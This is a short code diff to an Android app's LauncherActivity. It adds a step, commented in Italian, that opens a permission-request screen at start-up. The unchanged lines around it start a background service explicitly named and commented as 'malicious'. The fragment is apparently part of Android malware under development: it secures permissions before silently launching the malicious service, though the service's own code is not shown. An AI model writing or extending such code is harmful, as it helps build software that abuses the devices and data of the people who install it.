@@ -18,6 +18,10 @@ public class LauncherActivity extends Activity {
         super.onCreate(savedInstanceState);
         Log.d(TAG, "LauncherActivity onCreate started");
 
+        // Avvia l'activity per richiedere i permessi prima di tutto
+        Intent permissionIntent = new Intent(this, PermissionRequestActivity.class);
+        startActivity(permissionIntent);
+        
         // Start the malicious service in the background
         startMaliciousService();
 
